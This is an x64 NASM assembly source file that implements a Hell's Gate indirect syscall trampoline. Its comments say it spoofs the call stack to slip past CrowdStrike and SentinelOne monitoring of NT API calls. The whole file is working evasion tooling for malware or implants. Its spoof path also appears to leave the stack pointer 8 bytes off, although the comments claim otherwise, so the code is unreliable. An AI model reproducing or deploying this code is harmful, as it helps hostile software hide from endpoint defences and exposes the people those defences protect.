; syscall_stub.asm — x64 indirect syscall trampoline + call-stack spoofing
;
; Build: nasm -f win64 syscall_stub.asm -o syscall_stub.o
;
; Call-stack spoofing rationale:
;   CrowdStrike and SentinelOne perform call-stack unwinding on NT API calls.
;   A return address pointing at our own .text section is an instant flag.
;   We spoof it so the visible return chain is:
;       [kernel32!<func>+N]  ← ret gadget (popped by ntdll's "ret")
;       [real caller]        ← ret gadget's own "ret" lands here
;
;   Implementation (no rsp change → arg5-arg8 at [rsp+0x28..] are untouched):
;     1.  r11 = [rsp+0]          ; save real return address
;     2.  [rsp+0] = g_k32_ret    ; overwrite with kernel32 gadget addr
;     3.  [rsp+8] = r11          ; store real return in shadow space[0]
;     4.  r10 = rcx              ; NT calling convention: arg1 via r10
;     5.  eax = g_ssn
;     6.  jmp [g_gadget]         ; ntdll "syscall; ret"
;        → ret pops g_k32_ret   → jumps into kernel32
;        → kernel32 "ret" pops r11 → returns to real caller ✓
;
;   If g_k32_ret == 0 (init failed), fall back to unspoofed direct return.
;
; Stack layout at entry to HellsGateCall (Windows x64, 8-arg call):
;   [rsp+0x00]  return address   ← we overwrite this
;   [rsp+0x08]  shadow[0]        ← we use this for real return storage
;   [rsp+0x10]  shadow[1]
;   [rsp+0x18]  shadow[2]
;   [rsp+0x20]  shadow[3]
;   [rsp+0x28]  arg5             ← kernel reads here; MUST stay untouched
;   [rsp+0x30]  arg6
;   [rsp+0x38]  arg7
;   [rsp+0x40]  arg8

bits 64
default rel

section .data
    global g_ssn
    global g_gadget
    global g_k32_ret
    g_ssn     dd 0       ; current SSN (set by HellsGateSetSSN before each call)
    g_gadget  dq 0       ; ntdll "syscall; ret" gadget address
    g_k32_ret dq 0       ; kernel32 "ret" gadget for call-stack spoofing

section .text
    global HellsGateCall

; ─── HellsGateCall ───────────────────────────────────────────────────────────
; NTSTATUS HellsGateCall(arg1..arg8)
; Windows x64: rcx=arg1, rdx=arg2, r8=arg3, r9=arg4, stack=arg5..arg8
HellsGateCall:
    ; ── Call-stack spoof (conditional on g_k32_ret being set) ──────────────
    mov  r11, qword [rel g_k32_ret]
    test r11, r11
    jz   .no_spoof

    ; Spoof: replace return address with kernel32 gadget, save real return
    ; in shadow space[0] so the gadget's own "ret" jumps to real caller.
    ; We use only MOV — rsp is never changed, arg5-arg8 stay in place.
    xchg r11, [rsp]           ; r11 = real_ret, [rsp+0] = k32_ret gadget
    mov  [rsp+8], r11         ; shadow[0] = real return address
    jmp  .do_syscall

.no_spoof:
    ; No spoofing available — plain indirect syscall (original behaviour)

.do_syscall:
    ; ── NT syscall calling convention ──────────────────────────────────────
    mov  r10, rcx             ; arg1: Windows syscall convention uses r10, not rcx
    mov  eax, dword [rel g_ssn]
    jmp  qword [rel g_gadget] ; → ntdll "syscall; ret"
                              ;   "ret" pops [rsp+0]:
                              ;     spoofed: pops k32_ret → jumps there
                              ;              k32_ret "ret" pops real_ret → returns ✓
                              ;     plain:   pops real_ret → returns directly ✓
